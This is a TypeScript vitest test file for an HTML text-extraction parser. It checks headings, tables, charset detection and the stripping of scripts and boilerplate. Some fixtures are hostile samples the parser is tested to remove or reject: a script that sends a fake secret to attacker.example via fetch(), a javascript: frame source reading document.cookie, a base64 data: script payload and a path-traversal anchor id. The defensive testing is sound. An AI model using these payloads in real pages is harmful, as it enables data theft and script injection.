import type { ParsedUnit } from "@oscharko-dev/keiko-contracts";
import { describe, expect, it } from "vitest";

import { htmlParser } from "./html-parser.js";
import type { InternalParserResult } from "./types.js";
import {
  HTML_DANGEROUS,
  HTML_HEADINGS,
  encode,
  selectionFromBytes,
  selectionFromText,
} from "./parser-test-fixtures.js";
import { buildParserOptions } from "./registry.js";

function asBlock(unit: ParsedUnit | undefined): {
  readonly path: readonly string[];
  readonly span: { readonly start: number; readonly end: number };
} {
  if (unit?.kind !== "html-block")
    throw new Error(`expected html-block unit, got ${unit?.kind ?? "undefined"}`);
  return {
    path: unit.headingPath ?? [],
    span: { start: unit.characterStart, end: unit.characterEnd },
  };
}

describe("htmlParser", () => {
  it("matches by extension and media type", () => {
    expect(
      htmlParser.capability.matches(selectionFromText("<html></html>", { extension: "html" })),
    ).toBe(true);
    expect(
      htmlParser.capability.matches(
        selectionFromText("<html></html>", { extension: "", mediaType: "text/html" }),
      ),
    ).toBe(true);
    expect(htmlParser.capability.matches(selectionFromText("hi", { extension: "txt" }))).toBe(
      false,
    );
  });

  it("emits one html-block per heading section with headingPath populated", () => {
    const result = htmlParser.parse(
      selectionFromText(HTML_HEADINGS, { extension: "html" }),
      buildParserOptions({ now: () => 0 }),
    );
    expect(result.diagnostics).toEqual([]);
    const paths = result.units.map((unit) => asBlock(unit).path);
    expect(paths).toEqual([["Top"], ["Top", "Sub"], ["Top", "Sub", "Deeper"]]);
  });

  it("DROPS <script>/<style> contents entirely — no JS leaks into any unit (GRD-003)", () => {
    const result = htmlParser.parse(
      selectionFromText(HTML_DANGEROUS, { extension: "html" }),
      buildParserOptions({ now: () => 0 }),
    );
    // GRD-003: unit spans now index the cleaned `normalizedText` projection, so slice from
    // THERE (the persisted text + LLM excerpt), not the raw HTML.
    const text = (result as InternalParserResult).normalizedText ?? "";
    for (const unit of result.units) {
      const block = asBlock(unit);
      const span = text.slice(block.span.start, block.span.end);
      expect(span).not.toContain("alert(");
      expect(span).not.toContain("display:none");
      expect(span).not.toContain("fallback");
    }
    // The whole persisted projection must be free of script/style/markup.
    expect(text).not.toContain("alert(");
    expect(text).not.toContain("display:none");
    expect(text).not.toContain("<script");
    expect(text).not.toContain("<style");
    expect(/<[a-z!/]/i.test(text)).toBe(false);
  });

  it("never executes embedded JavaScript (defence-in-depth: the parser path is pure)", () => {
    // We construct a script that would mutate a global if executed. The parser is pure
    // string traversal — no eval, no Function, no DOM — so this global remains undefined.
    const globalKey = "__htmlParserExecuted266";
    const html = `<html><body><h1>X</h1><script>globalThis['${globalKey}']=true;</script></body></html>`;
    htmlParser.parse(
      selectionFromText(html, { extension: "html" }),
      buildParserOptions({ now: () => 0 }),
    );
    expect((globalThis as Record<string, unknown>)[globalKey]).toBeUndefined();
  });

  it("handles inline text outside any heading with an empty headingPath", () => {
    const html = "<html><body>Outside text.<h1>H</h1>Inside.</body></html>";
    const result = htmlParser.parse(
      selectionFromText(html, { extension: "html" }),
      buildParserOptions({ now: () => 0 }),
    );
    const paths = result.units.map((unit) => asBlock(unit).path);
    // First block has no heading path; second is under H.
    expect(paths[0]).toEqual([]);
    expect(paths.at(-1)).toEqual(["H"]);
  });

  it("ignores comments, DOCTYPE, and processing instructions", () => {
    const html =
      "<!DOCTYPE html><!-- comment --><?xml-stylesheet ?><html><body><h1>X</h1>Body.</body></html>";
    const result = htmlParser.parse(
      selectionFromText(html, { extension: "html" }),
      buildParserOptions({ now: () => 0 }),
    );
    expect(result.units.some((unit) => asBlock(unit).path[0] === "X")).toBe(true);
  });

  it("refuses oversize HTML", () => {
    const big = encode("<html>" + "a".repeat(200) + "</html>");
    const result = htmlParser.parse(
      selectionFromBytes(big, { extension: "html" }),
      buildParserOptions({ now: () => 0, maxBytes: 10 }),
    );
    expect(result.units).toEqual([]);
    expect(result.diagnostics[0]?.code).toBe("OVERSIZED_FILE");
  });

  it("truncates with UNIT_LIMIT_REACHED when there are more blocks than allowed", () => {
    const html = "<html><body><h1>A</h1>p<h1>B</h1>q<h1>C</h1>r<h1>D</h1>s</body></html>";
    const result = htmlParser.parse(
      selectionFromText(html, { extension: "html" }),
      buildParserOptions({ now: () => 0, maxUnitsPerDocument: 2 }),
    );
    expect(result.units.length).toBeLessThanOrEqual(2);
    expect(result.diagnostics.some((d) => d.code === "UNIT_LIMIT_REACHED")).toBe(true);
  });

  it("emits PARSER_CANCELLED when the signal is already aborted", () => {
    const ac = new AbortController();
    ac.abort();
    const result = htmlParser.parse(
      selectionFromText(HTML_HEADINGS, { extension: "html" }),
      buildParserOptions({ now: () => 0, signal: ac.signal }),
    );
    expect(result.diagnostics.some((d) => d.code === "PARSER_CANCELLED")).toBe(true);
  });

  it("treats an unterminated <script> as raw text consumed to EOF (no execution path)", () => {
    const html = "<html><body><h1>X</h1><script>unterminated";
    const result = htmlParser.parse(
      selectionFromText(html, { extension: "html" }),
      buildParserOptions({ now: () => 0 }),
    );
    const text = (result as InternalParserResult).normalizedText ?? "";
    for (const unit of result.units) {
      const block = asBlock(unit);
      expect(text.slice(block.span.start, block.span.end)).not.toContain("unterminated");
    }
    expect(text).not.toContain("unterminated");
  });

  it("respects the heading stack — H2 then H1 resets the path", () => {
    const html = "<h1>Top</h1>a<h2>Sub</h2>b<h1>Top2</h1>c";
    const result = htmlParser.parse(
      selectionFromText(html, { extension: "html" }),
      buildParserOptions({ now: () => 0 }),
    );
    const paths = result.units.map((unit) => asBlock(unit).path);
    expect(paths).toEqual([["Top"], ["Top", "Sub"], ["Top2"]]);
  });

  it("projects HTML table rows with header/cell semantics", () => {
    const html =
      "<main><h1>Inventory</h1><table><tr><th>Name</th><th>Preis</th></tr><tr><td>A</td><td>42</td></tr></table></main>";
    const result = htmlParser.parse(
      selectionFromText(html, { extension: "html" }),
      buildParserOptions({ now: () => 0 }),
    );
    const text = (result as InternalParserResult).normalizedText ?? "";
    expect(text).toContain("Table: Name=A | Preis=42");
    const tableBlock = result.units.find((unit) => {
      if (unit.kind !== "html-block") return false;
      return text.slice(unit.characterStart, unit.characterEnd).includes("Name=A");
    });
    expect(tableBlock).toMatchObject({ kind: "html-block", headingPath: ["Inventory"] });
  });

  it("prefers main content and skips nav/footer/cookie boilerplate", () => {
    const html = [
      "<body>",
      "<nav>Home Pricing Legal</nav>",
      '<div class="cookie-banner">Accept cookies</div>',
      "<main><h1>Policy</h1><p>Main retention is 90 days.</p></main>",
      "<footer>Footer legal links</footer>",
      "</body>",
    ].join("");
    const result = htmlParser.parse(
      selectionFromText(html, { extension: "html" }),
      buildParserOptions({ now: () => 0 }),
    );
    const text = (result as InternalParserResult).normalizedText ?? "";
    expect(text).toContain("Main retention is 90 days.");
    expect(text).not.toContain("Accept cookies");
    expect(text).not.toContain("Footer legal links");
    expect(text).not.toContain("Home Pricing Legal");
  });

  it("strips a UTF-8 BOM before scanning", () => {
    const bytes = new Uint8Array([0xef, 0xbb, 0xbf, ...encode("<h1>Title</h1>body")]);
    const result = htmlParser.parse(
      selectionFromBytes(bytes, { extension: "html" }),
      buildParserOptions({ now: () => 0 }),
    );
    expect(asBlock(result.units[0]).path).toEqual(["Title"]);
  });

  it("completes a 1 MB HTML with 200 <script> tags within 500 ms (no O(n²) toLowerCase)", () => {
    // Each script block adds ~5 KB of content so the document approaches 1 MB.
    const scriptBlock = `<script>${"x".repeat(5_000)}</script>`;
    const html = `<html><body><h1>Title</h1>${scriptBlock.repeat(200)}<p>end</p></body></html>`;
    const bytes = encode(html);
    const start = Date.now();
    htmlParser.parse(
      selectionFromBytes(bytes, { extension: "html" }),
      buildParserOptions({ now: () => start }),
    );
    expect(Date.now() - start).toBeLessThan(500);
  });
});

describe("htmlParser — cleaned normalizedText (GRD-003)", () => {
  it("emits a tag/script/style/secret-free normalizedText while preserving visible facts", () => {
    const html =
      "<!doctype html><html><head><title>Policy</title>" +
      '<script>const S="sk-should-never-appear-9988";fetch("http://attacker.example/x");</script>' +
      "<style>.x{color:red}</style></head><body>" +
      "<h1>Credit Policy</h1><p>The Tier-2 overdraft limit is 250,000 EUR.</p>" +
      "<p>Contact <a href='mailto:ops@example.com'>ops</a> for details.</p></body></html>";
    const result = htmlParser.parse(
      selectionFromText(html, { extension: "html" }),
      buildParserOptions({ now: () => 0 }),
    );
    const text = (result as InternalParserResult).normalizedText ?? "";
    expect(text).toContain("250,000 EUR");
    expect(text).toContain("Contact ops for details");
    expect(text).not.toContain("sk-should-never-appear-9988");
    expect(text).not.toContain("attacker.example");
    expect(text).not.toContain("<script");
    expect(text).not.toContain("<style");
    expect(text).not.toContain("<a");
    expect(text).not.toContain("color:red");
    // Every unit span must slice cleanly out of the projection.
    for (const unit of result.units) {
      const block = asBlock(unit);
      const span = text.slice(block.span.start, block.span.end);
      expect(span.length).toBe(block.span.end - block.span.start);
      expect(span).not.toContain("<");
    }
  });
});

// ─── Technical manual structure (Epic #1855, Issue #1886) ────────────────────

function parseHtml(html: string): { readonly units: readonly ParsedUnit[]; readonly text: string } {
  const result = htmlParser.parse(
    selectionFromText(html, { extension: "html" }),
    buildParserOptions({ now: () => 0 }),
  );
  return { units: result.units, text: (result as InternalParserResult).normalizedText ?? "" };
}

function blockTexts(html: string): readonly string[] {
  const { units, text } = parseHtml(html);
  return units.map((unit) => text.slice(asBlock(unit).span.start, asBlock(unit).span.end));
}

function expectEverySpanMarkupFree(html: string): void {
  const { units, text } = parseHtml(html);
  for (const unit of units) {
    const span = text.slice(asBlock(unit).span.start, asBlock(unit).span.end);
    expect(span).not.toContain("<");
  }
}

describe("htmlParser — technical manual structure (#1855)", () => {
  it("captures the document <title> as a searchable block even behind <main>", () => {
    const texts = blockTexts(
      "<!doctype html><html><head><title>Payment Gateway API</title></head>" +
        "<body><main><h1>Overview</h1><p>Intro.</p></main></body></html>",
    );
    expect(texts[0]).toBe("Payment Gateway API");
    expect(texts).toContain("Intro.");
  });

  it("does not double-emit the <title> when the document has no <main>", () => {
    const texts = blockTexts(
      "<html><head><title>Handbook</title></head><body><p>Body.</p></body></html>",
    );
    expect(texts.filter((t) => t === "Handbook")).toHaveLength(1);
  });

  it("keeps definition-list terms attached to their definitions", () => {
    const texts = blockTexts(
      "<html><body><dl><dt>Timeout</dt><dd>Seconds before the request is abandoned.</dd>" +
        "<dt>Retries</dt><dd>Maximum retry count.</dd></dl></body></html>",
    );
    expect(texts).toContain("Timeout: Seconds before the request is abandoned.");
    expect(texts).toContain("Retries: Maximum retry count.");
  });

  it("preserves <pre>/<code> whitespace, identifiers, and language hint", () => {
    const html =
      '<html><body><pre><code class="language-bash">export KEIKO_MODE=on\n' +
      "  run --strict</code></pre></body></html>";
    const { units, text } = parseHtml(html);
    const codeUnit = units.find((unit) => {
      const span = asBlock(unit).span;
      return text.slice(span.start, span.end).includes("KEIKO_MODE");
    });
    expect(codeUnit).toBeDefined();
    const code = text.slice(asBlock(codeUnit).span.start, asBlock(codeUnit).span.end);
    expect(code).toContain("Code (bash):");
    // Verbatim: the newline and the two-space indentation of the second line survive.
    expect(code).toContain("export KEIKO_MODE=on\n  run --strict");
    expectEverySpanMarkupFree(html);
  });

  it("stamps the nearest heading anchor id onto blocks in that section", () => {
    const { units } = parseHtml(
      '<html><body><h2 id="error-codes">Error Codes</h2><p>E_TIMEOUT means the call expired.</p>' +
        "<h2>Untagged</h2><p>No anchor here.</p></body></html>",
    );
    const anchorFor = (heading: string): string | undefined => {
      const unit = units.find(
        (candidate) =>
          candidate.kind === "html-block" && candidate.headingPath?.includes(heading) === true,
      );
      return unit?.kind === "html-block" ? unit.anchorId : undefined;
    };
    expect(anchorFor("Error Codes")).toBe("error-codes");
    expect(anchorFor("Untagged")).toBeUndefined();
  });

  it("surfaces frameset navigation targets redacted of host and query tokens", () => {
    const texts = blockTexts(
      '<html><frameset cols="20%,80%"><frame src="toc.html">' +
        '<frame src="https://manuals.example/private/intro.html?token=secret#frag">' +
        "</frameset></html>",
    );
    expect(texts).toContain("Frame: toc.html");
    expect(texts).toContain("Frame: /private/intro.html");
    expect(texts.join(" ")).not.toContain("token=secret");
    expect(texts.join(" ")).not.toContain("manuals.example");
  });

  it("warns when the declared <meta charset> disagrees with the decoded byte shape", () => {
    const result = htmlParser.parse(
      selectionFromText(
        '<html><head><meta charset="shift_jis"></head><body><p>ASCII body.</p></body></html>',
        { extension: "html" },
      ),
      buildParserOptions({ now: () => 0 }),
    );
    const codes = result.diagnostics.map((d) => d.code);
    expect(codes).toContain("HTML_CHARSET_MISMATCH");
    // Degrades predictably: the body is still extracted rather than lost.
    expect((result as InternalParserResult).normalizedText).toContain("ASCII body.");
  });

  it("uses the declared charset to decode legacy bytes that are not valid UTF-8", () => {
    // 0xE9 is 'é' in windows-1252 but an invalid standalone UTF-8 lead byte.
    const bytes = new Uint8Array([
      ...encode('<html><head><meta charset="windows-1252"></head><body><p>caf'),
      0xe9,
      ...encode("</p></body></html>"),
    ]);
    const result = htmlParser.parse(
      selectionFromBytes(bytes, { extension: "html" }),
      buildParserOptions({ now: () => 0 }),
    );
    expect((result as InternalParserResult).normalizedText).toContain("café");
    expect(result.diagnostics.map((d) => d.code)).not.toContain("HTML_CHARSET_MISMATCH");
  });
});

// ─── Post-merge audit regressions (Epic #1855, Issue #1886) ──────────────────

describe("htmlParser — post-merge audit fixes (#1886)", () => {
  it("does not truncate an outer table row at a nested sub-table's closing tag", () => {
    // A parameter table where one cell lists sub-options in its own table. The pre-fix
    // non-greedy `<tr>...</tr>` regex stopped at the INNER table's </tr>, dropping "Outer2" from
    // the row structure — it leaked separately as stray body text instead of staying part of the
    // "Table: ..." row projection, so assert it lands INSIDE that one row block.
    const texts = blockTexts(
      "<table><tr><td>Outer1<table><tr><td>Inner</td></tr></table></td>" +
        "<td>Outer2</td></tr></table>",
    );
    const rowBlock = texts.find((t) => t.startsWith("Table:"));
    expect(rowBlock).toBeDefined();
    expect(rowBlock).toContain("Outer1");
    expect(rowBlock).toContain("Inner");
    expect(rowBlock).toContain("Outer2");
    // Exactly one row was emitted for the outer table (the nested table must not produce its own
    // independently-counted "Table: ..." row block collapsed into the outer one incorrectly).
    expect(texts.filter((t) => t.startsWith("Table:"))).toHaveLength(1);
  });

  it("does not truncate a nested <dl> inside a <dd> — no sibling term/definition lost", () => {
    const text = blockTexts(
      "<dl><dt>Outer</dt><dd>OuterDef<dl><dt>Inner</dt><dd>InnerDef</dd></dl>Tail</dd>" +
        "<dt>Sibling</dt><dd>SiblingDef</dd></dl>",
    ).join(" ");
    expect(text).toContain("Tail");
    expect(text).toContain("Sibling: SiblingDef");
  });

  it("surfaces <table><caption> text instead of silently dropping it", () => {
    const texts = blockTexts(
      "<table><caption>Table 4-2: HTTP Status Codes</caption>" +
        "<tr><td>200</td><td>OK</td></tr></table>",
    );
    expect(texts).toContain("Table caption: Table 4-2: HTTP Status Codes");
  });

  it("finds the real <title>, not a <title>-shaped literal inside an earlier <script>", () => {
    const html =
      '<html><head><script>var x = "<title>fake</title>";</script>' +
      "<title>Real Title</title></head><body></body></html>";
    const texts = blockTexts(html);
    expect(texts).toContain("Real Title");
    expect(texts.join(" ")).not.toContain("fake");
  });

  it("does not raise HTML_CHARSET_MISMATCH for prose that merely contains the word 'charset'", () => {
    const result = htmlParser.parse(
      selectionFromText(
        "<html><body><p>Set the charset to auto in Settings &gt; Advanced</p></body></html>",
        { extension: "html" },
      ),
      buildParserOptions({ now: () => 0 }),
    );
    expect(result.diagnostics.map((d) => d.code)).not.toContain("HTML_CHARSET_MISMATCH");
  });

  it("still detects a real <meta charset> mismatch after scoping the scan to <meta> tags", () => {
    const result = htmlParser.parse(
      selectionFromText(
        '<html><head><meta charset="shift_jis"></head><body><p>Body.</p></body></html>',
        { extension: "html" },
      ),
      buildParserOptions({ now: () => 0 }),
    );
    expect(result.diagnostics.map((d) => d.code)).toContain("HTML_CHARSET_MISMATCH");
  });

  it("does not mis-terminate a tag at a literal '>' inside a quoted attribute value", () => {
    // Pre-fix: readTagAt's naive indexOf(">", ...) stopped inside the quoted title, corrupting
    // tag.raw (losing `src`) and leaking the rest of the tag verbatim (incl. the query token)
    // into normalizedText as ordinary body text.
    const texts = blockTexts(
      '<frameset><frame title="Section > Details" ' +
        'src="https://manuals.example/private/path?token=abc123"></frameset>',
    );
    const joined = texts.join(" ");
    expect(joined).toContain("Frame: /private/path");
    expect(joined).not.toContain("token=abc123");
    expect(joined).not.toContain("manuals.example");
    expect(joined).not.toContain("Details");
  });

  it("does not corrupt a heading label when a preceding attribute contains a literal '>'", () => {
    const { units } = parseHtml('<h2 title="Step 1 > Step 2">Overview</h2><p>Body.</p>');
    const headingUnit = units.find(
      (unit) => unit.kind === "html-block" && unit.headingPath?.includes("Overview") === true,
    );
    expect(headingUnit).toBeDefined();
  });

  it("rejects a path-like anchorId (contains '/') instead of accepting it as a slug", () => {
    const { units } = parseHtml('<h2 id="../../etc/passwd">Traversal</h2><p>Body.</p>');
    const unit = units.find((candidate) => candidate.kind === "html-block");
    expect(unit?.kind === "html-block" ? unit.anchorId : "missing").toBeUndefined();
  });

  it("rejects an anchorId with an embedded quote character", () => {
    const { units } = parseHtml(`<h2 id='a"b'>Entity</h2><p>Body.</p>`);
    const unit = units.find((candidate) => candidate.kind === "html-block");
    expect(unit?.kind === "html-block" ? unit.anchorId : "missing").toBeUndefined();
  });

  it("rejects a scheme-like anchorId that has no '//' (bypassing the old blocklist)", () => {
    const { units } = parseHtml('<h1 id="javascript:alert(1)">Heading</h1><p>Body.</p>');
    const unit = units.find((candidate) => candidate.kind === "html-block");
    expect(unit?.kind === "html-block" ? unit.anchorId : "missing").toBeUndefined();
  });

  it("still accepts an ordinary heading-id anchor slug", () => {
    const { units } = parseHtml('<h2 id="section-4.2:notes">Notes</h2><p>Body.</p>');
    const unit = units.find((candidate) => candidate.kind === "html-block");
    expect(unit?.kind === "html-block" ? unit.anchorId : undefined).toBe("section-4.2:notes");
  });

  it("rejects a javascript: frame src instead of forwarding it verbatim", () => {
    const texts = blockTexts(
      '<frameset><frame src="javascript:alert(document.cookie)">' + "</frameset>",
    );
    expect(texts.join(" ")).not.toContain("javascript:");
    expect(texts.join(" ")).not.toContain("alert(");
  });

  it("rejects a data: frame src instead of forwarding an arbitrary base64 payload", () => {
    const texts = blockTexts(
      '<frameset><frame src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">' +
        "</frameset>",
    );
    expect(texts.join(" ")).not.toContain("data:");
    expect(texts.join(" ")).not.toContain("base64");
  });

  it("still surfaces an ordinary relative and absolute http(s) frame src", () => {
    const texts = blockTexts(
      '<frameset><frame src="toc.html"><frame src="https://manuals.example/a/b.html">' +
        "</frameset>",
    );
    expect(texts).toContain("Frame: toc.html");
    expect(texts).toContain("Frame: /a/b.html");
  });

  it("caps an oversized declared-charset label instead of embedding it unbounded", () => {
    const hugeLabel = "a".repeat(2000);
    const result = htmlParser.parse(
      selectionFromText(
        `<html><head><meta charset="${hugeLabel}"></head><body><p>Body.</p></body></html>`,
        { extension: "html" },
      ),
      buildParserOptions({ now: () => 0 }),
    );
    const mismatch = result.diagnostics.find((d) => d.code === "HTML_CHARSET_MISMATCH");
    expect(mismatch).toBeDefined();
    expect(mismatch?.message.length ?? 0).toBeLessThan(300);
  });

  it("drops a <script> nested inside <pre>, <table>, <dl>, and <title> (GRD-003)", () => {
    const secret = "sk-should-never-appear-9988";
    const payload = `<script>const S="${secret}";fetch("http://attacker.example/x");</script>`;
    const html =
      `<html><head><title>${payload}Doc</title></head><body>` +
      `<pre>${payload}code</pre>` +
      `<table><tr><td>${payload}cell</td></tr></table>` +
      `<dl><dt>Term</dt><dd>${payload}def</dd></dl>` +
      "</body></html>";
    const { text } = parseHtml(html);
    expect(text).not.toContain(secret);
    expect(text).not.toContain("attacker.example");
    expect(text).not.toContain("<script");
  });

  it("drops a <script> nested in <table>/<dl> even when its body contains a literal closing tag", () => {
    // A raw-text body containing a `</table>`- or `</dl>`-shaped substring (plausible in a JS
    // string literal or a document.write template) must not be mistaken for the real close tag
    // by the depth-aware nested-element walk — that would prematurely end the scan and leak the
    // remainder of the script body verbatim (GRD-003), same class as the test above but exercised
    // through findNestableElementEnd instead of the top-level body scanner.
    const secret = "sk-nested-close-tag-should-never-appear-4477";
    const tableHtml =
      `<table><tr><td><script>var s = "</table>"; var t = "${secret}";</script>` +
      "RealCellText</td></tr><tr><td>SecondRowCell</td></tr></table>";
    const dlHtml =
      `<dl><dt>Term</dt><dd><script>var s = "</dl>"; var t = "${secret}";</script>` +
      "RealDefText</dd><dt>Sibling</dt><dd>SiblingDef</dd></dl>";
    for (const html of [tableHtml, dlHtml]) {
      const { text } = parseHtml(html);
      expect(text).not.toContain(secret);
      expect(text).not.toContain("<script");
      expect(text).not.toContain("</table");
      expect(text).not.toContain("</dl");
    }
    expect(blockTexts(tableHtml).join(" ")).toContain("SecondRowCell");
    expect(blockTexts(dlHtml).join(" ")).toContain("Sibling: SiblingDef");
  });

  it("does not leak the rest of the document as raw markup after an unclosed attribute quote", () => {
    // Pre-fix: an unterminated quote left the quote-aware tag scan tracking "inside a quote" all
    // the way to EOF, so readTagAt reported the tag as absent and the scanner fell back to
    // emitting raw, un-stripped markup as literal text for the REST OF THE DOCUMENT (an unbounded
    // leak from one malformed tag), instead of degrading within the scope of that single tag.
    const html = '<h2 id="x>Title</h2><p>Rest of body.</p>';
    const { text } = parseHtml(html);
    expect(text).not.toContain("<h2");
    expect(text).not.toContain("</h2>");
    expect(text).not.toContain("<p>");
    expect(text).toContain("Rest of body.");
  });

  it("redacts a protocol-relative frame src instead of forwarding its host verbatim", () => {
    const texts = blockTexts('<frameset><frame src="//evil.example/private/path"></frameset>');
    const joined = texts.join(" ");
    expect(joined).not.toContain("evil.example");
    expect(joined).toContain("Frame: /private/path");
  });
});

// ─── GRD-003 nested-tag leak hardening (2026-07-07 audit, AUDIT-E1855-001) ────
// `skipElement` (backing the <title>/<pre> metadata/preformatted skip and the boilerplate
// <nav>/<footer>/<aside> drop) used a plain `indexOf("</" + tagName)` substring search with no
// awareness of a nested <script>/<style>/<noscript> subtree. A raw-text body containing a literal
// closing-tag-shaped substring for its OWN container (e.g. a JS string literal `"</pre>"` inside a
// <script> nested in a <pre>) was mis-read as the container's real close tag, prematurely ending
// the skip and leaking the remainder of the still-open <script> body as ordinary text.
describe("htmlParser — nested-script leak hardening across skip paths (audit 2026-07-07)", () => {
  const secret = "PRE-LEAKED-SECRET-ABC";
  function nestedScriptPayload(closingTag: string): string {
    return (
      `<script>var s="</${closingTag}>";var secret="${secret}";` +
      'fetch("http://attacker.example/y");</script>'
    );
  }

  it("drops a <script> nested in <pre> even when its body contains a literal </pre> substring", () => {
    const html = `<pre>code${nestedScriptPayload("pre")}tail</pre><p>After.</p>`;
    const { text } = parseHtml(html);
    expect(text).not.toContain(secret);
    expect(text).not.toContain("attacker.example");
    expect(text).not.toContain("<script");
    expect(text).toContain("After.");
  });

  it("drops a <script> nested in <title> even when its body contains a literal </title> substring", () => {
    const html =
      `<html><head><title>Doc${nestedScriptPayload("title")}Tail</title></head>` +
      "<body><p>Body.</p></body></html>";
    const { text } = parseHtml(html);
    expect(text).not.toContain(secret);
    expect(text).not.toContain("attacker.example");
    expect(text).not.toContain("<script");
    expect(text).toContain("Body.");
  });

  it.each(["nav", "footer", "aside"] as const)(
    "drops a <script> nested in <%s> even when its body contains the container's own literal closing-tag substring",
    (tagName) => {
      const html = `<${tagName}>boiler${nestedScriptPayload(tagName)}tail</${tagName}><p>Main.</p>`;
      const { text } = parseHtml(html);
      expect(text).not.toContain(secret);
      expect(text).not.toContain("attacker.example");
      expect(text).not.toContain("<script");
      expect(text).toContain("Main.");
    },
  );
});

// ─── Table colspan/rowspan hardening (2026-07-07 audit, AUDIT-E1855-002) ──────
// Header/row extraction was purely positional (no colspan/rowspan awareness), silently
// misaligning headers from values for merged-cell tables.
describe("htmlParser — table span hardening (audit 2026-07-07)", () => {
  it("expands a colspan header so values stay aligned with their real column headers", () => {
    const html =
      '<table><tr><th colspan="2">Category</th><th>Other</th></tr>' +
      "<tr><td>A</td><td>B</td><td>C</td></tr></table>";
    const texts = blockTexts(html);
    const row = texts.find((t) => t.startsWith("Table:"));
    expect(row).toBeDefined();
    expect(row).toBe("Table: Category=A | Category 2=B | Other=C");
  });

  it("emits HTML_TABLE_SPAN_UNSUPPORTED when a header cell uses rowspan > 1", () => {
    const result = htmlParser.parse(
      selectionFromText(
        '<table><tr><th rowspan="2">Id</th><th>Value</th></tr>' +
          "<tr><td>2</td></tr><tr><td>1</td><td>x</td></tr></table>",
        { extension: "html" },
      ),
      buildParserOptions({ now: () => 0 }),
    );
    expect(result.diagnostics.map((d) => d.code)).toContain("HTML_TABLE_SPAN_UNSUPPORTED");
  });
});
